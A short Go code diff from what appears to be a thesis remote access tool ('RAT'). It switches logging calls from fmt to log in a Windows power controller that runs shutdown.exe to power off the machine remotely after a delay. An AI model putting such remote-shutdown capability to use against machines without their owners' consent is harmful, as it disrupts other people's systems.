@@ -5,6 +5,7 @@ package service
 import (
 	"context"
 	"fmt"
+	"log"
 	"os/exec"
 	"sync/atomic"
 	"time"
@@ -36,7 +37,7 @@ func (controller *WindowsPowerController) Shutdown(ctx context.Context) error {
 	if delay <= 0 {
 		delay = 3 * time.Second
 	}
-	fmt.Printf("[REAL POWER] shutdown scheduled in %s\n", delay)
+	log.Printf("real power shutdown scheduled in %s", delay)
 
 	time.AfterFunc(delay, func() {
 		// /t 0 avoids Windows implicitly enabling /f for positive shutdown.exe
@@ -50,7 +51,7 @@ func (controller *WindowsPowerController) Shutdown(ctx context.Context) error {
 			"/c", "Thesis RAT remote shutdown",
 		)
 		if err := cmd.Run(); err != nil {
-			fmt.Println("[REAL POWER] shutdown command failed:", err)
+			log.Printf("real power shutdown command failed: %v", err)
 			controller.scheduled.Store(false)
 		}
 	})
